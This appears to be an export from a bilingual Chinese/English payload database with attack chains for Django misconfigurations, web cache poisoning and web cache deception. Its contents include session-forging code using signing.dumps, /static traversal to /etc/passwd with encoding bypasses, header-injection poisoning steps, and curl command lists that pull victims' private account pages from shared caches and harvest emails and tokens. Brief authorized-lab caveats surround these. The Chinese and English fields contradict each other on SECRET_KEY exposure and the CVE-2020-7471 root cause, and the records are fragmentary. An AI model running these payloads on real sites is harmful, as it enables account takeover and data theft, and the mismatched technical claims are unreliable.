prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: Django 版本与安全配置回归针对 Django 部署的配置缺口场景。覆盖 CVE-2020-7471 StringAgg 注入探测、DEBUG 页面配置提取、signing 签名伪造与静态目录路径遍历四类验证维度。
overview.en: The Django version and security-configuration regression targets configuration gaps in Django deployments. It covers four verification dimensions: CVE-2020-7471 StringAgg injection probing, DEBUG-page configuration extraction, signing forgery, and static-directory path traversal.

vulnerability.zh: 根因按维度不同：StringAgg 的 delimiter 参数未做 SQL 转义即拼接进聚合 SQL；DEBUG 开启使错误页暴露应用配置与调试信息（SECRET_KEY 等敏感项被掩码显示）；静态处理未规范化 ../ 导致目录穿越；密钥泄露后 signing 机制可被伪造。
vulnerability.en: Root causes differ by dimension: __contains lookup values are concatenated into StringAgg-generated SQL; DEBUG on leaks SECRET_KEY and database settings via error pages; static handling without ../ normalization allows traversal; and with the key leaked, the signing mechanism can be forged.

exploitation.zh: 按 Payload 列表顺序使用：先请求不存在路径触发 DEBUG 页，确认调试模式与配置暴露；拿到泄露密钥（需结合 .env/源码等其他渠道）后用第 3 步 signing.dumps 伪造会话值并以 loads 校验；再用第 1 步在 StringAgg 的 delimiter 夹带 SQL 片段验证注入；最后用第 4 步 curl --path-as-is 验证 /static 穿越。被拦截时改用路径编码变形。
exploitation.en: Use payloads in list order: request a nonexistent path to trigger the DEBUG page and confirm SECRET_KEY and database-setting leakage; with the key, forge session values via step 3's signing.dumps verified by loads; then test StringAgg injection with step 1's SQL fragments inside __contains values; finally verify /static traversal with step 4's curl --path-as-is. Use path-encoding variants when blocked.

mitigation.zh: 生产关闭 DEBUG，SECRET_KEY 进入密钥管理并轮换已泄露密钥，升级到修复 CVE-2020-7471 与 CVE-2021-28658 的版本，静态服务规范化路径并限定根目录。修复后重放第 1-4 步，确认错误页无配置、签名校验拒绝伪造值且遍历被拒绝。
mitigation.en: Disable DEBUG in production, move SECRET_KEY into secret management and rotate leaked keys, upgrade to versions fixing CVE-2020-7471 and CVE-2021-28658, and normalize static paths within a confined root. After the fix, replay steps 1-4 and confirm error pages leak nothing, signature checks reject forgeries, and traversal is denied.

title.zh: 触发 DEBUG 页提取配置

description.zh: 请求不存在的路径触发 Django 报错页，确认调试模式并提取路由、中间件、数据库引擎与主机白名单等配置信息；SECRET_KEY 等敏感项为掩码显示，需另寻泄露渠道。命中判据：报错页暴露调试与配置细节。
description.en: Request a missing path to pop the DEBUG page and lift SECRET_KEY/DATABASES. Success: secrets appear on the error page.

description.zh: 用泄露的 SECRET_KEY 以 signing.dumps 构造任意会话值，并通过 loads 检查。命中判据：伪造会话被服务端接受。
description.en: With SECRET_KEY, mint session values via signing.dumps that pass loads. Success: forged sessions are accepted.

attackChain.payload:
import django.core.signing as signing
signing.loads(session_value, key=SECRET_KEY)
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)

description.zh: 在 StringAgg 的 delimiter 参数中夹带 SQL 注释与语句片段，利用参数拼接执行。命中判据：注入语句影响聚合结果或触发数据库报错。
description.en: Tuck SQL comment/fragments into __contains lookup values. Success: injected SQL alters query results.

description.zh: 以 --path-as-is 请求 /static 加 ../ 穿越序列读取系统文件。命中判据：读到 /etc/passwd 内容。
description.en: Request /static with ../ sequences using --path-as-is. Success: /etc/passwd content is returned.

title.zh: 编码变形绕过路径过滤

description.zh: 穿越序列被过滤时改用双重编码与过度编码 UTF-8 变形提交请求。命中判据：变形路径成功读取目标文件内容。
description.en: When ../ is filtered, switch to double-encoded and overlong UTF-8 variants. Success: a mutated path reads files.

opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: 触发 DEBUG 页面提取配置
title.en: Trigger the DEBUG page and extract configuration

execution.command:
curl -s http://{LAB_APP}/nonexistent
# DEBUG 页面泄露清单
- SECRET_KEY
- DATABASES
- ALLOWED_HOSTS

description.zh: 请求不存在的路径触发 Django DEBUG 404 调试页确认调试模式开启；进一步触发未捕获异常（500）可在 Settings 帧看到 ALLOWED_HOSTS、中间件、数据库引擎等配置，但 SECRET_KEY 等敏感项会被掩码显示，需结合 .env/源码泄露等其他渠道获取。
description.en: Request a nonexistent path to raise the Django DEBUG error page and confirm the leak of SECRET_KEY, database settings, and ALLOWED_HOSTS.

title.zh: 伪造 Django signing 签名

execution.command:
import django.core.signing as signing
signing.loads(session_value, key=SECRET_KEY)
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)

description.zh: 拿到 SECRET_KEY 后用 signing.dumps 构造任意会话值并以 loads 校验通过，验证签名机制在密钥泄露后可被伪造。
description.en: With SECRET_KEY in hand, craft arbitrary session values with signing.dumps and pass loads verification, proving signatures are forgeable once the key leaks.

title.zh: 静态目录路径遍历验证

description.zh: 以 GET 与 curl --path-as-is 请求穿越 /static 的相对路径，验证服务端不规范化 ../ 时可读取 /etc/passwd。
description.en: Request a ../ traversal under /static with GET and curl --path-as-is, verifying /etc/passwd is readable when the server does not normalize dot segments.

description.zh: 对同一遍历路径分别施加单次编码、双重编码与 UTF-8 超长编码，验证仅做一次解码的黑名单拦截可被绕过。
description.en: Apply single encoding, double encoding, and UTF-8 overlong encoding to the same traversal path, verifying blacklists that decode once can be evaded.

explanation.zh: UTF-8 超长编码的 /，部分解析器会接受
explanation.en: UTF-8 overlong encoding of /, accepted by some parsers

name.zh: Web 缓存投毒

description.zh: 覆盖 Web 缓存投毒的键差异验证：从缓存命中状态头探测与未键入头识别，到投毒响应注入与 Fat GET 参数扩展，并附缓存键分派变体头清单，用于确认哪些输入会改变缓存内容。
description.en: Covers key-differential validation of web cache poisoning: from cache-hit header probing and unkeyed-input identification through poisoned-response injection and Fat GET parameter expansion, with cache-key dispatch variant header lists, confirming which inputs alter cached content.

subCategory.zh: 缓存键与未键入头投毒

prerequisites.zh: 确认 Web 缓存键与响应变体验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache-Key and Response-Variant Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖 Web 缓存投毒场景，检验共享缓存的键构造是否遗漏可影响响应内容的输入。验证维度含 X-Cache 命中探测、X-Forwarded-Host 未键入头识别、基础投毒与 Fat GET 参数扩展，对应第 1 至第 4 步。
overview.en: This payload covers web cache poisoning, testing whether the shared cache key omits inputs that influence response content. Validation covers X-Cache hit probing, X-Forwarded-Host unkeyed-header identification, baseline poisoning, and Fat GET parameter extension, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存键与源站响应生成所依赖的输入不一致：X-Forwarded-Host 等未键入头能改写生成链接，Fat GET 的正文参数可参与渲染，攻击者注入的值被缓存共享给全部用户。
vulnerability.en: The root cause is divergence between the cache key and the inputs that drive response generation: unkeyed headers such as X-Forwarded-Host rewrite generated links, and Fat GET body parameters join rendering, so attacker-injected values get cached and shared with all users.

exploitation.zh: 第 1 步对目标 URL 追加唯一参数发 HEAD 请求，从 X-Cache 确认缓存行为；第 2 步注入 X-Forwarded-Host，响应内链接指向注入域且键未覆盖即确认未键入头；第 3 步发送带注入头的原始请求，投毒响应被缓存后无头请求同样返回注入内容即确认投毒；第 4 步以 Fat GET 验证正文参数入缓存。占位符在全局变量菜单替换；被拦时参考 wafBypass 变体清单。
exploitation.en: In step 1, send a HEAD with a unique cache parameter and read X-Cache. In step 2, inject X-Forwarded-Host; links pointing at the injected domain with the key ignoring it confirm the unkeyed header. In step 3, send the raw request with the injected header; once cached, header-less requests returning injected content confirm poisoning. In step 4, verify body parameters entering the cache with Fat GET. Replace placeholders via the global variables menu; see wafBypass variant lists if blocked.

mitigation.zh: 把所有影响响应的输入纳入缓存键，禁用或固定派生 Host 类头，拒绝带正文的 GET 请求；对投毒高危路径降低共享缓存寿命。修复后重放第 3、4 步，缓存应保持原响应且无跨用户污染。
mitigation.en: Include every response-affecting input in the cache key, disable or pin derived Host headers, reject GETs with bodies, and shorten shared-cache lifetimes on high-risk paths. After the fix, replay steps 3 and 4: the cache should keep the original response with no cross-user contamination.

description.zh: 向目标 URL 追加唯一参数发送 HEAD 请求并提取 X-Cache 头；两次请求出现 MISS 转 HIT 的变化即确认响应经过缓存层，同时锁定适合投毒的共享页面入口。
description.en: Send a HEAD request with a unique cache-buster parameter and read the X-Cache header; a MISS-to-HIT transition proves responses come from a shared cache and identifies the page worth poisoning.

title.zh: 注入未键入头定位投毒点
title.en: Inject unkeyed headers to find the poisoning vector

description.zh: 用第 1 步确认的缓存路径，注入指向攻击者域名的 X-Forwarded-Host 头；响应中的生成链接或重定向跳向注入域名且缓存键未包含该头，即找到可写入缓存的未键入输入。
description.en: Inject X-Forwarded-Host pointing at the attacker domain on the cached path; if generated links or redirects honor the injected host while the cache key ignores the header, the unkeyed input is confirmed.

description.zh: 发送携带注入头的原始 GET 请求让恶意响应写入缓存；随后不带该头的普通请求返回指向攻击者域的内容，即投毒成功，访问同 URL 的所有用户都会收到污染响应。
description.en: Send the crafted GET so the poisoned response is stored, then request the same URL without the header; if ordinary visitors receive attacker-domain content, the shared cache entry is poisoned.

title.zh: 用 Fat GET 扩大投毒面

description.zh: 在 GET 请求中附带 q=poisoned 正文检验正文是否参与缓存判定；普通 GET 返回被篡改的正文即确认第二条投毒路径，可与第 3 步的头注入叠加扩大影响范围。
description.en: Append a q=poisoned body to a GET request to test whether bodies join the cache decision; a tampered response on a plain GET confirms a second poisoning vector that stacks with header injection.

title.en: Bypass key normalization with header variants

description.zh: 当单个头被拦截时，换用 X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 等变体组合重试投毒；任一变体仍能把恶意内容写入缓存即绕过键归一化。
description.en: If the single header is filtered, retry the poisoning with X-Forwarded-Scheme, X-Original-URL and X-Forwarded-Prefix variants; any variant that still lands in the cache bypasses key normalization.

analysis.zh: Web 缓存键与响应变体验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache-Key and Response-Variant Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用唯一无害响应头标记确认未键入输入能否改变共享缓存对象，不注入脚本或影响其他用户。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

description.zh: 向目标 URL 追加唯一缓存键参数并发送 HEAD 请求，从响应中提取 X-Cache 头以确认响应是否由缓存返回。
description.en: Appends a unique cache-key parameter to the target URL and sends a HEAD request, extracting the X-Cache header to confirm whether the response came from the cache.

description.zh: 注入 X-Forwarded-Host 未键入头并观察响应；响应中的生成链接或重定向指向注入域名，且缓存键未纳入该头，即确认未键入头注入点。
description.en: Inject the unkeyed X-Forwarded-Host header and observe the response; generated links or redirects pointing at the injected domain while the cache key ignores the header confirms an unkeyed injection point.

explanation.zh: 常被用作缓存键但未包含在键中
explanation.en: Describes how the header segment "X-Forwarded-Host" participates in this validation command.

description.zh: 发送携带注入头的原始请求并观察缓存行为；投毒响应被缓存后，不带该头的后续请求返回指向注入域的内容，即确认缓存投毒。
description.en: Send the raw request with the injected header and watch caching; if the poisoned response is cached and later requests without the header receive injected-domain content, cache poisoning is confirmed.

description.zh: 发送 Fat GET 请求观察正文是否参与缓存；后续对同 URL 的普通 GET 返回 q=poisoned 正文，即确认 Fat GET 投毒。
description.en: Send the Fat GET and check whether the body participates in caching; later plain GETs to the same URL returning the q=poisoned body confirm Fat GET poisoning.

explanation.en: Describes how the header segment "Content-Length" participates in this validation command.

title.zh: 缓存键分派变体头清单

description.zh: 枚举 X-Forwarded-Host、X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 四类常被纳入缓存键或影响路由的请求头，用于逐一注入并观察响应差异。
description.en: Lists X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, and X-Forwarded-Prefix headers that are often included in cache keys or affect routing, for one-by-one injection and response-diff observation.

title.zh: 未键入输入的缓存变体验证

wafBypass.command:
GET /cache-fixture?PAYLOADER_CACHE_VARIANT=1 HTTP/1.1
Host: {TARGET}
X-Forwarded-Host: cache-variant.lab.invalid
X-Payloader-Cache-Marker: PAYLOADER_CACHE_VARIANT

description.zh: 以单一无害的缓存变体请求完成探测：只比较该无害标记在不同会话与无会话请求中的缓存键、Vary、Age 与响应哈希，头部仅在当前响应回显时不直接等同于跨用户污染。
description.en: Replace mixed script-injection and request-smuggling fragments with one cache-variant request. Compare the harmless marker across different-session and no-session requests using cache keys, Vary, Age, and response hashes; do not equate a reflected header with cross-user poisoning.

name.zh: Web 缓存欺骗

description.zh: 覆盖 Web 缓存欺骗的私有响应隔离验证：从路径缓存响应头探测与路径后缀伪装访问私有资源，到分隔符与编码变体绕过路径判定，并核验缓存响应是否含私有字段，用于确认私有响应可被他人命中。
description.en: Covers private-response isolation validation of web cache deception: from path cache-header probing and path-suffix disguise to fetch private resources through delimiter and encoding variants bypassing path judgment, verifying whether cached responses contain private fields, confirming private responses can be hit by others.

subCategory.zh: 缓存欺骗与私有内容泄露

prerequisites.zh: 确认 Web 缓存私有响应隔离验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache Private-Response Isolation Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 该 Payload 覆盖 Web 缓存欺骗的私有响应隔离场景，检验静态后缀路径能否让含用户数据的动态响应进入共享缓存并被匿名命中。验证维度含缓存头探测、路径后缀伪装、分隔符编码变体与私有字段核验，对应第 1 至第 4 步。
overview.en: This payload covers web cache deception and private-response isolation, testing whether static-suffix paths push dynamic responses containing user data into a shared cache that anonymous users can hit. Validation covers cache-header probing, path-suffix disguise, delimiter and encoding variants, and private-field verification, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存层与源站对路径的静态资源判定不一致：带 .css、.js 后缀或编码分隔符的账号路径被当作可缓存对象，携带会话的响应因此存储进公共键。
vulnerability.en: The root cause is cache-to-origin divergence on static-resource path classification: account paths with .css or .js suffixes or encoded delimiters are treated as cacheable objects, so session-carrying responses land under public keys.

exploitation.zh: 第 1 步对首页与静态路径发 HEAD 并提取 X-Cache、Age、Cache-Control，确认哪些路径会进缓存；第 2 步携带会话请求 account 加静态后缀，再匿名重复访问，取回私有内容即确认欺骗成立；第 3 步用分号与编码变体测试路径判定分歧；第 4 步在缓存响应中检索 email 等私有字段留证。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, HEAD the home and static paths extracting X-Cache, Age and Cache-Control to learn what gets cached. In step 2, request the account path with a static suffix carrying the session, then anonymously; retrieving private content confirms the deception. In step 3, probe path-classification divergence with semicolon and encoding variants. In step 4, search cached responses for private fields like email as evidence. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.zh: 按 Content-Type 与认证状态决定缓存资格，认证响应一律 no-store 或私有化；规范路径解析避免后缀伪装。修复后重放第 2、4 步，匿名请求应取不到私有内容。
mitigation.en: Decide cacheability by Content-Type and authentication state, marking authenticated responses no-store or private; normalize path parsing to defeat suffix disguise. After the fix, replay steps 2 and 4: anonymous requests should retrieve no private content.

description.zh: 对首页、css/js/jpg 静态资源与账号页逐一提取 X-Cache、Age、Cache-Control 头；静态后缀命中缓存而账号页不缓存，即摸清 CDN 的静态资源判定规则。
description.en: Collect X-Cache, Age and Cache-Control headers for the homepage, static assets and the account page; learning which suffixes the CDN treats as cacheable defines the disguise rule to abuse.

attackChain.payload:
curl -sI "http://{TARGET}/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"
curl -sI "http://{TARGET}/test.css" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.js" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/test.jpg" | grep -iE "x-cache|age"
curl -sI "http://{TARGET}/account" | grep -iE "x-cache|age|cache-control"

title.zh: 伪装静态后缀套取私有页面
title.en: Fetch private pages via static-suffix disguise

description.zh: 携带受害者会话请求 /account/profile.css，源站返回账号数据而缓存按静态键存储；随后匿名请求同 URL 拿到账号内容即完成缓存欺骗，私密数据进入共享缓存。
description.en: Request /account/profile.css with the victim session so the origin returns account data under a static cache key; an anonymous request to the same URL returning the data completes the deception.

attackChain.payload:
curl -b "session={USER_SESSION}" "http://{TARGET}/account/profile.css"
curl "http://{TARGET}/account/profile.css"
curl "http://{TARGET}/account/x.js"
curl "http://{TARGET}/account/x.jpg"
curl "http://{TARGET}/account/x.png"
curl "http://{TARGET}/api/user/info/x.css"
curl "http://{TARGET}/settings/x.svg"

title.zh: 编码变体绕过路径判定
title.en: Bypass path classification with encoded variants

description.zh: 用分号参数、%23、%3f、点段等 URL 编码变体重访账号路径，制造缓存与源站的路径归一化分歧；任一变体匿名可复取私有数据即绕过静态判定规则。
description.en: Revisit the account path with semicolon parameters, %23, %3f and dot-segment variants to split cache and origin path normalization; any variant that anonymously re-serves private data bypasses the rule.

attackChain.payload:
curl "http://{TARGET}/account;x.css"
curl "http://{TARGET}/account%23x.css"
curl "http://{TARGET}/account%3fx.css"
curl "http://{TARGET}/account?cb=123.css"
curl "http://{TARGET}/account/..%2fstatic/x.css"
# RPO (Relative Path Overwrite):
curl "http://{TARGET}/account/..%2f..%2fstatic/style.css"
curl "http://{TARGET}/account/./x.css"
curl "http://{TARGET}/account%2fx.css"

title.zh: 提取缓存中的敏感字段
title.en: Harvest sensitive fields from the cache

description.zh: 从被缓存的账号响应中提取 email、phone、address、token 字段并核对头像资源的 X-Cache 状态；敏感字段可被匿名读取即量化越权范围，完成数据收割。
description.en: Extract email, phone, address and token fields from the cached account response and check X-Cache on avatar resources; anonymously readable sensitive fields quantify the account takeover scope.

analysis.zh: Web 缓存私有响应隔离验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache Private-Response Isolation Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用专用账号和不含隐私的标记响应，验证路径解析差异是否导致认证页面被共享缓存。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。
